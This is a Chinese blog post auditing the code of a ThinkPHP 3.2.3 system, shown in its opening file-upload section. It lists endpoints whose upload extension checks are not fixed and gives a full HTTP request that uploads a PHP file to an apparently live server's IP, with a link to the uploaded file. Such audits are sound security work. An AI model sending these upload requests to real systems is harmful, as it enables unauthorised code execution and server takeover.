<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="北京壹号云信息技术有限公司 成功案例：http:&#x2F;&#x2F;www.yhyvideo.com&#x2F;index.php?c&#x3D;article&amp;a&#x3D;type&amp;tid&#x3D;53  由于该套系统比较大，故分为文件上传篇，越权篇，SQL注入篇，XSS篇，SSRF篇，其他篇几部分 另外我们拿到源码第一件事就是看配置文件，找连接数据库的用户权限是否是root，以及数据库版本是否小于等于5.6  这意味着我们后续的">
<meta property="og:type" content="article">
<meta property="og:title" content="基于tp3-2-3框架的代码审计_0">
<meta property="og:url" content="http://example.com/2023/04/25/%E5%9F%BA%E4%BA%8Etp3-2-3%E6%A1%86%E6%9E%B6%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-0/index.html">
<meta property="og:site_name" content="塔菲">
<meta property="og:description" content="北京壹号云信息技术有限公司 成功案例：http:&#x2F;&#x2F;www.yhyvideo.com&#x2F;index.php?c&#x3D;article&amp;a&#x3D;type&amp;tid&#x3D;53  由于该套系统比较大，故分为文件上传篇，越权篇，SQL注入篇，XSS篇，SSRF篇，其他篇几部分 另外我们拿到源码第一件事就是看配置文件，找连接数据库的用户权限是否是root，以及数据库版本是否小于等于5.6  这意味着我们后续的">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://s1.ax1x.com/2023/04/18/p9PTwhq.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/25/image05f0a4600a0de3c1.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/04/18/p9PTrcT.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/04/18/p9PTojO.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/04/18/p9PT7uD.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/04/18/p9PTHDe.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/04/18/p9PTLEd.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/04/18/p9PTOUA.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/04/18/p9PTX4I.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/04/18/p9PTzgf.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/04/18/p9P7Sv8.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/04/18/p9P79KS.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/04/18/p9P7FEj.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/04/18/p9P7kUs.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/04/18/p9P7VCq.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/04/18/p9P7mvT.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2023/04/18/6f7503de5b78758ef408e0214f0250ed.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2023/04/18/073c205f027a57e1f7da39b570f21b1e.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2023/04/18/c28a109b4cbc7aa461309bc2372df708.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2023/04/18/665f13ba3c506f222c2b0ae37c90c526.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2023/04/18/49dd6c9c49f85511938b63c92ec16015.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2023/04/18/a4b5870dd21973d9e3f1fd5279c250b9.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2023/04/18/7c2c88af9b197f68d2ea4bb3731d8930.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2023/04/18/69254d8b9f6e964fa85e310915c20d46.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2023/04/18/7d24007491e473ad98f09a446cb47d40.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2023/04/18/be9a9b834bcb866fe0e7dd6b429c2846.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2023/04/18/3254c7cd119fbc7ff37b829e24ce0cc8.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2023/04/18/eb9b085cb68fe08117dc8f3e93366e4b.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2023/04/18/708d33c067838fd4642825cfa9f2c9d5.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2023/04/18/684e8d98e76a17a5f1ddfd94fa2cd6f8.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2023/04/18/23ee4136c369680db1ac2c3902dc5144.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2023/04/18/c85a00741bf8e958185f811c60ef95a9.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2023/04/18/edcecaef952355c764020c6564d60f8b.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2023/04/18/f4a6909c54ff27b5098303b032c391e4.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/02/ppFgO9x.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/02/aa2209cba7f4a6b7.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/02/dc80a5375e13dba8.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/02/69405eab40cd8a8c.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/02/0c82b5c74d0d3d8d.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/02/f6fe6062227eb6df.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/02/fc856a173e823296.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/02/dd3962cf9abc1bb1.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/02/ppFRCsU.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/02/ppFRFZ4.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/02/106676ec0c723bf3.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/02/e97ce7cc61fed60e.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/02/ec8325b3384c1dd3.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/02/f4e839360963b4a4.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/02/a4063173abd8784a.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/02/837ca481dd91bc03.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/02/921a58708c3fcb84.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/02/5d788c6f51d790390efc0ca8f55c7ac1.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/02/4cb221aa97b099fb710996dc1e544d67.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/02/efdd5eef641a579cc24d8f80498506ab.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/02/498d448f2877cab9c1bacb83959c4700.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/02/2f368cbef5213bda.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/02/d21bfd1022bf7264.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/02/3d5a110347d9a04d.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/02/ac72004487079f1e.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/02/ad2483474bc88eea.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/02/8423b4fcf9ec7274.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/02/ppF7ZYF.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/02/ppF7hmq.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/02/ppF757V.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/02/bd739c504111379b35251a474a7e3a7d.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/02/45d738d11ce53ec27520cdd536e37f8f.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/02/8a65e1c64fabcc93bc5d587ad6f4bd63.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/02/272d519b1aae267169b4395865f74b4e.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/02/8de250ee89a823dcbe6c464cf36f638a.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/02/aba75bdb1a702fa542c3e77fc0a7ccc4.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/25/ppDsqxO.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/25/ppDsXse.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/25/ppDyKJ0.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/25/ppDy7wj.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/28/pp6bF8P.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/28/pp6bkgf.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/25/ppDy56S.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/25/ppD62B4.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/25/ppDgjpt.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/25/ppD2ZcV.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/25/ppD2ikj.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/25/ppD2khn.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/25/ppD2891.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/25/ppDcN26.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/25/ppD27vV.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/25/ppDRFbD.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/25/ppDRAVe.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/25/ppDRiDO.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/25/ppD7cJU.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/25/ppD7gWF.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/25/ppDH5cQ.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/25/ppDqFqs.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/25/ppDqeiV.png">
<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/25/3a522ec6f032601115f112f518939fc2.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/25/ppDoUk8.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/25/ppDodfg.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/25/ppDoBlj.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/25/ppDoymq.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/25/ppDoH76.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/03/25/ppD7mGD.png">
<meta property="article:published_time" content="2023-04-25T07:29:42.000Z">
<meta property="article:modified_time" content="2023-05-25T07:31:12.802Z">
<meta property="article:author" content="塔菲">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s1.ax1x.com/2023/04/18/p9PTwhq.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>基于tp3-2-3框架的代码审计_0</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.2"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/04/25/edusrc%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8F%90%E4%BA%A4-0/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/04/22/%E5%AF%B9%E6%9F%90%E6%97%A6%E5%A4%A7%E5%AD%A6%E7%9A%84%E4%B8%80%E5%A5%97dotnet%E5%BC%80%E5%8F%91%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/04/25/%E5%9F%BA%E4%BA%8Etp3-2-3%E6%A1%86%E6%9E%B6%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/04/25/%E5%9F%BA%E4%BA%8Etp3-2-3%E6%A1%86%E6%9E%B6%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-0/&text=基于tp3-2-3框架的代码审计_0"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/04/25/%E5%9F%BA%E4%BA%8Etp3-2-3%E6%A1%86%E6%9E%B6%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-0/&title=基于tp3-2-3框架的代码审计_0"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/04/25/%E5%9F%BA%E4%BA%8Etp3-2-3%E6%A1%86%E6%9E%B6%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-0/&is_video=false&description=基于tp3-2-3框架的代码审计_0"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=基于tp3-2-3框架的代码审计_0&body=Check out this article: http://example.com/2023/04/25/%E5%9F%BA%E4%BA%8Etp3-2-3%E6%A1%86%E6%9E%B6%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/04/25/%E5%9F%BA%E4%BA%8Etp3-2-3%E6%A1%86%E6%9E%B6%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-0/&title=基于tp3-2-3框架的代码审计_0"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/04/25/%E5%9F%BA%E4%BA%8Etp3-2-3%E6%A1%86%E6%9E%B6%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-0/&title=基于tp3-2-3框架的代码审计_0"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/04/25/%E5%9F%BA%E4%BA%8Etp3-2-3%E6%A1%86%E6%9E%B6%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-0/&title=基于tp3-2-3框架的代码审计_0"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/04/25/%E5%9F%BA%E4%BA%8Etp3-2-3%E6%A1%86%E6%9E%B6%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-0/&title=基于tp3-2-3框架的代码审计_0"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/04/25/%E5%9F%BA%E4%BA%8Etp3-2-3%E6%A1%86%E6%9E%B6%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-0/&name=基于tp3-2-3框架的代码审计_0&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/04/25/%E5%9F%BA%E4%BA%8Etp3-2-3%E6%A1%86%E6%9E%B6%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-0/&t=基于tp3-2-3框架的代码审计_0"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%A5%97"><span class="toc-number">1.</span> <span class="toc-text">第一套</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87"><span class="toc-number">1.1.</span> <span class="toc-text">文件上传篇</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83%E7%AF%87"><span class="toc-number">1.2.</span> <span class="toc-text">越权篇</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83%E7%AF%87-1"><span class="toc-number">1.3.</span> <span class="toc-text">越权篇</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSRF%E7%AF%87"><span class="toc-number">1.4.</span> <span class="toc-text">SSRF篇</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%AF%87%EF%BC%88%E5%B0%91%E6%8C%96%E5%87%A0%E4%B8%AA%E4%BB%A3%E8%A1%A8%E6%80%A7%E7%9A%84%EF%BC%8CSQL%E6%95%B0%E9%87%8F%E6%AF%94%E8%BE%83%E5%A4%9A%EF%BC%89"><span class="toc-number">1.5.</span> <span class="toc-text">SQL注入篇（少挖几个代表性的，SQL数量比较多）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0"><span class="toc-number">1.5.1.</span> <span class="toc-text">后台</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0"><span class="toc-number">1.5.2.</span> <span class="toc-text">前台</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8XSS%E7%AF%87"><span class="toc-number">1.6.</span> <span class="toc-text">存储XSS篇</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84XSS%E7%AF%87"><span class="toc-number">1.7.</span> <span class="toc-text">反射XSS篇</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%A5%97"><span class="toc-number">2.</span> <span class="toc-text">第二套</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84XSS"><span class="toc-number">2.0.1.</span> <span class="toc-text">反射XSS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84XSS-2"><span class="toc-number">2.0.2.</span> <span class="toc-text">反射XSS * 2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.0.3.</span> <span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5-2"><span class="toc-number">2.0.4.</span> <span class="toc-text">SQL注入 * 2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5-3"><span class="toc-number">2.0.5.</span> <span class="toc-text">SQL注入 * 3</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9E%8B%E5%8F%B7%E8%B6%8A%E6%9D%83-%E8%BA%AB%E4%BB%BD%E8%AF%81"><span class="toc-number">2.0.6.</span> <span class="toc-text">查看型号越权-身份证</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84XSS-3"><span class="toc-number">2.0.7.</span> <span class="toc-text">反射XSS * 3</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell"><span class="toc-number">2.0.8.</span> <span class="toc-text">文件上传getshell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0xml%E6%89%93XSS%EF%BC%88%E7%99%BE%E5%BA%A6%E7%BC%96%E8%BE%91%E5%99%A8%EF%BC%89"><span class="toc-number">2.0.9.</span> <span class="toc-text">文件上传xml打XSS（百度编辑器）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SSRF-%E7%BC%96%E8%BE%91%E5%99%A8%E5%AF%BC%E8%87%B4%E7%9A%84"><span class="toc-number">2.0.10.</span> <span class="toc-text">SSRF-编辑器导致的</span></a></li></ol></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        基于tp3-2-3框架的代码审计_0
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">塔菲</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-04-25T07:29:42.000Z" class="dt-published" itemprop="datePublished">2023-04-25</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>北京壹号云信息技术有限公司</p>
<p>成功案例：<a target="_blank" rel="noopener" href="http://www.yhyvideo.com/index.php?c=article&amp;a=type&amp;tid=53">http://www.yhyvideo.com/index.php?c=article&amp;a=type&amp;tid=53</a></p>
<p><img src="https://s1.ax1x.com/2023/04/18/p9PTwhq.png"></p>
<p>由于该套系统比较大，故分为文件上传篇，越权篇，SQL注入篇，XSS篇，SSRF篇，其他篇几部分</p>
<p>另外我们拿到源码第一件事就是看配置文件，找连接数据库的用户权限是否是root，以及数据库版本是否小于等于5.6</p>
<p><img src="https://cdnjson.com/images/2023/05/25/image05f0a4600a0de3c1.png" alt="image05f0a4600a0de3c1.png"></p>
<p>这意味着我们后续的SQL注入都可以写入文件来getshell，而且这是thinkphp框架，很多地方都暴露了绝对路径</p>
<h3 id="第一套"><a href="#第一套" class="headerlink" title="第一套"></a>第一套</h3><p>F:\代码审计\北京壹号云信息技术有限公司\123\html</p>
<h4 id="文件上传篇"><a href="#文件上传篇" class="headerlink" title="文件上传篇"></a>文件上传篇</h4><p>在tp3中，通常是利用webuploader这个文件上传组件</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9PTrcT"><img src="https://s1.ax1x.com/2023/04/18/p9PTrcT.png" alt="p9PTrcT.png"></a></p>
<p>比如这里预定义了上传规则，限制了上传后缀是jpg.jpeg,png</p>
<p>我们就要全局搜索</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$upload_config = array(</span><br></pre></td></tr></table></figure>

<p>去找到后缀不是写死的限制。</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9PTojO"><img src="https://s1.ax1x.com/2023/04/18/p9PTojO.png" alt="p9PTojO.png"></a></p>
<p>没写死的有</p>
<p>4)/Home/Wk/task_post</p>
<p>3)/Ucenter/Layim/uploadFile</p>
<p>2)/Ucenter/Resource/attr_post</p>
<p>1)/Ucenter/Resource/fileupload</p>
<p>4处文件上传没有限制死后缀</p>
<p>====</p>
<p>1）/Ucenter/Resource/fileupload</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ucenter/resource/fileupload</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>218.27.202.223:8088</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------200007686915473635932396477851</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>518</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>xxx</span><br><span class="line"></span><br><span class="line"><span class="language-sas">-----------------------------200007686915473635932396477851</span></span><br><span class="line"><span class="language-sas">Content-Disposition: form-data; name=<span class="variable">&amp;quot</span>;<span class="keyword">file</span><span class="variable">&amp;quot</span>;; <span class="keyword">filename</span>=<span class="variable">&amp;quot</span>;1.php<span class="variable">&amp;quot</span>;</span></span><br><span class="line"><span class="language-sas">Content-Type: image/jpeg</span></span><br><span class="line"><span class="language-sas"></span></span><br><span class="line"><span class="language-sas">xxx</span></span><br><span class="line"><span class="language-sas"></span></span><br><span class="line"><span class="language-sas">-----------------------------200007686915473635932396477851--</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9PT7uD"><img src="https://s1.ax1x.com/2023/04/18/p9PT7uD.png" alt="p9PT7uD.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9PTHDe"><img src="https://s1.ax1x.com/2023/04/18/p9PTHDe.png" alt="p9PTHDe.png"></a></p>
<p><a target="_blank" rel="noopener" href="http://218.27.202.223:8088/tmp/c4ca4238a0b923820dcc509a6f75849b/2147eff6fcbc5c8e54b43743cf18c99d.php">http://218.27.202.223:8088/tmp/c4ca4238a0b923820dcc509a6f75849b/2147eff6fcbc5c8e54b43743cf18c99d.php</a></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9PTLEd"><img src="https://s1.ax1x.com/2023/04/18/p9PTLEd.png" alt="p9PTLEd.png"></a></p>
<p>上传成功</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9PTOUA"><img src="https://s1.ax1x.com/2023/04/18/p9PTOUA.png" alt="p9PTOUA.png"></a></p>
<p>这里我们的请求包既不携带id，也不携带fuid，所以save_path就只是我们的uid的md5，而我是用superadmin登录的，uid是1</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9PTX4I"><img src="https://s1.ax1x.com/2023/04/18/p9PTX4I.png" alt="p9PTX4I.png"></a></p>
<p>而上传文件名我们没有定义，也没有return返回</p>
<p>2)/Ucenter/Resource/attr_post</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9PTzgf"><img src="https://s1.ax1x.com/2023/04/18/p9PTzgf.png" alt="p9PTzgf.png"></a></p>
